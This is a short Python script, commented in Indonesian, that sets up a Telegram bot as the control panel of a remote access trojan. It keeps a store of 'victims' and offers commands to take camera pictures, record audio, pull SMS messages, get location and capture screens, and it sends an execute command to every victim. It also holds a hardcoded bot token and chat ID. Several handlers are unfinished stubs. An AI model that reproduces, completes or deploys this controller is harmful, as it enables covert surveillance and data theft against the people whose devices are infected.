import telebot
import os
import threading
from flask import Flask

TOKEN = "8283668164:AAFBRMnVLlBWk1Fwll-XXPwT8HMujW5EeUo"
CHAT_ID = "7924673692"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot Aktif!"

# Simpan data korban
victims = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🔥 RAT Control Panel\n\nPerintah:\n/cam - Jepret kamera\n/audio - Rekam suara\n/sms - Ambil SMS\n/loc - Ambil lokasi\n/screen - Screenshot\n/list - List korban")

@bot.message_handler(commands=['cam'])
def cam_cmd(message):
    # Kirim perintah ke semua korban
    for victim_id in victims.keys():
        try:
            bot.send_message(victim_id, "EXEC:cam")
        except:
            pass
    bot.reply_to(message, "📸 Perintah kirim ke semua korban")

@bot.message_handler(commands=['audio'])
def audio_cmd(message):
    bot.reply_to(message, "🎤 Rekam audio 10 detik...")
    # Logika untuk kirim perintah ke korban

def run_bot():
    print("🤖 Bot starting...")
    bot.polling()

def run_web():
    app.run(host='0.0.0.0', port=8080)

if __name__ == "__main__":
    # Jalankan web server di thread terpisah
    web_thread = threading.Thread(target=run_web)
    web_thread.daemon = True
    web_thread.start()
    
    # Jalankan bot
    run_bot()
